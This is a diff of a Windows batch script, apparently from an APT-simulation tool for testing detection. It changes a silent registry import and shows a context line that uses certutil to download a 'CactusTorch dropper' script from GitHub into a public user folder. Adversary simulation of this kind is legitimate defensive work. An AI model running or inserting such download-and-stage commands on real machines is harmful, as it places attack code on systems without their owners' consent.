@@ -7,7 +7,7 @@ ping -n 5 127.0.0.1 > NUL
 
 ECHO Fixing possible problems with JavaScript on the system
 "%ZIP%" e -p%PASS% "%FILEARCH%" -aoa -o"%TEMP%" workfiles\jsfix.reg > NUL
-regedit.exe /s "%TEMP%\jsfix.reg"
+reg import /s "%TEMP%\jsfix.reg"
 
 ECHO Downloading the CactusTorch dropper (press Enter if it takes more than 20s)
 cmd.exe /c certutil.exe -urlcache -split -f https://raw.githubusercontent.com/NextronSystems/APTSimulator/master/download/cactus.js C:\Users\Public\en-US.js
